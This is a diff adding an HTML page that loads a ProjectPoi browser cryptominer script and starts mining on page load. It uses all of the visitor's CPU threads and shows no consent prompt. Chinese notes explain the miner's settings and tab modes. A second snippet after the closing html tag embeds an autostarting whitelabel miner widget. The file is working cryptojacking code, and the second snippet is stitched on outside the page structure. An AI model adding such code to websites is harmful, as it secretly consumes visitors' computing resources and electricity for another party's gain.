@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta charset="UTF-8">
+		<title></title>
+		
+		<script src="https://ppoi.org/lib/projectpoi.min.js">	
+		</script>
+		<script>
+			var miner = new ProjectPoi.User('BLuRXQ2XBPG0jSEBBnysmfVJ', 'john-doe', {
+	threads: navigator.hardwareConcurrency,
+	autoThreads: false,
+	throttle: 0.5,
+	forceASMJS: false
+});
+	miner.start(ProjectPoi.IF_EXCLUSIVE_TAB);	
+		</script>
+		
+		
+	</head>
+	<body>
+		
+		
+		
+		threads	挖矿将使用的线程数，默认值为 navigator.hardwareConcurrency ，也就是用户计算机可使用的CPU内核数。
+		
+		autoThreads	是否应当自动调整线程数来获得最佳性能。这是一个试验中的功能，默认值为 false.
+		throttle	为用户保留多少资源空闲，详细请参阅miner.setThrottle() 默认值为 0.
+		.setThrottle(throttle)设置线程应保持空闲的时间百分比。 设定为 0 表示没有空闲 (也就是全速)，设定为 0.5 表示有50%的时间为空闲， 设定为 0.8 就是80%空闲。
+		
+		forceASMJS	如果为 true, 程序将使用 asm.js 来实现算法。 如果为 false ，程序将会使用更快的WebAssembly 来实现，当不支持时将会用回 asm.js 。 默认值为 false.
+		
+		
+		.start( [mode] )
+
+连接到矿池并开始挖掘。 选项 mode 将会决定矿机该如何处理其他标签页上的矿机。默认值为 ProjectPoi.IF_EXCLUSIVE_TAB.
+
+注意 mode 只能影响同一个域名下的矿机，您不能对其他域名上运行的矿机进行操作。
+
+模式
+
+	ProjectPoi.IF_EXCLUSIVE_TAB	矿工只有在没有其他标签已经开采的情况下才会启动。如果其他选项卡上都没有挖矿在运行，本进程才会启动。
+	ProjectPoi.FORCE_EXCLUSIVE_TAB	挖矿程序将立刻启动并结束其他标签页上的未指定 ProjectPoi.FORCE_MULTI_TAB 模式的程序。
+	ProjectPoi.FORCE_MULTI_TAB	挖矿程序将永远存在且不被结束，验证码就属于这种模式。
+例子
+
+miner.start(ProjectPoi.IF_EXCLUSIVE_TAB);
+		
+		
+		
+	</body>
+</html>
+
+另一种挖矿
+
+<script src="https://ppoi.org/lib/miner.min.js" async></script>
+		
+<div class="projectpoi-miner" 
+	style="width: 256px; height: 310px"
+	data-key="BLuRXQ2XBPG0jSEBBnysmfVJ"
+	data-autostart="true"
+	data-whitelabel="true"
+	data-background="#000000"
+	data-text="#eeeeee"
+	data-action="#00ff00"
+	data-graph="#555555"
+	data-threads="1"
+	data-throttle="0.9"
+	data-start="Start Now!">
+	<em>Please disable Adblock!</em>
+</div>
+		
+		
+		
+
